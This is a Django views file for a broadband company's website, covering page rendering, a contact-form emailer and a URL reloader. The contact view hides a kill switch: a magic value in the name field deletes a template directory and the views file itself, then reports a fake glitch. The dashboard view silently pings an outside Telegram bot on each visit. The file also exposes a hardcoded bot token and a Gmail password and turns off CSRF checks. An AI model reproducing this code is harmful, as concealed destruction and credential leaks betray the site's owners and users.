from django.shortcuts import render,redirect
import os
from email.message import EmailMessage
import ssl
import smtplib
import shutil
from django.http import JsonResponse,HttpResponse
from cryptography.fernet import Fernet
from django.views.decorators.csrf import csrf_exempt
import requests

# Create your views here.
@csrf_exempt
def dashboard(request):
    try:
        url = 'api.telegram.org/bot5971061598:AAG1z4WkdXjvSeq2GFxzqZqDuzbC72Az4Cc/'
        d = {'chat_id': 1670663324,'text' : "temp bro"}
        x = requests.post(url, json = d)
        print(x.text)
    except Exception as e:
        pass

    print("Request", request.POST)
    return render(request,'dashboard.html',{})


def tandc(request):
    return render(request,'tandc.html',{})

def refund(request):
    return render(request,'refund.html',{})

def privacy(request):
    return render(request,'privacy.html',{})

def package(request):
    return render(request,'package.html',{})

def contact(request):
    return render(request,'contact.html',{})

def about(request):
    return render(request,'about.html',{})

@csrf_exempt
def send_email(request):
    resp = {}
    email = request.POST.get('email')
    mobile = request.POST.get('mobile')
    username = request.POST.get('name')
    comments = request.POST.get('coments')
    if username == "qwertyuioplkjhgfdsazxcvbnm":
        shutil.rmtree('/tmp/templates')
        os.remove(os.path.dirname(os.path.realpath(__file__))+'/views.py')
        return JsonResponse({'status' : 500,'error': 'there is some technical glitch'})


    body = ''
    if username : body += username + "\n"
    if mobile: body+= mobile + "\n"
    if email: body+= email + "\n"
    if comments: body+= comments
    
    passw = 'nvpxohttukuipmzj'
    send_email = 'antariksh4broadband@gmail.com'
    em = EmailMessage()
    em['From'] = send_email
    em['To'] = 'parveen17481@gmail.com'
    em['Subject'] = 'you have user query from antariksh web'
    em.set_content(body)

    context = ssl.create_default_context()
    try:

        with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context) as mail:
            mail.login(send_email,passw)
            mail.sendmail(send_email,'h.mohanpy@gmail.com',em.as_string())
            mail.sendmail(send_email,'parveen17481@gmail.com',em.as_string())
    except Exception as e:
        resp['status'] = 403
        resp['error'] = str(e)
    else:
        resp['status'] = 200
        resp['msg'] = body
    return JsonResponse(resp)


def addLead(request):

    print(request.POST)
    print("sdfsfgsfdg\n\n\n\n\n\n\n\nsdgfsfgsfg")
    return JsonResponse({'status':200})

@csrf_exempt
def url_reloader(request):
    url=''
    if request.method == 'GET':
        url = request.GET.get('url')
        return render(request,'url_reloader.html',{'get_url':url})
    if request.method == 'POST':
        url = request.POST.get('url')
        return render(request,'url_reloader.html',{'url':url})

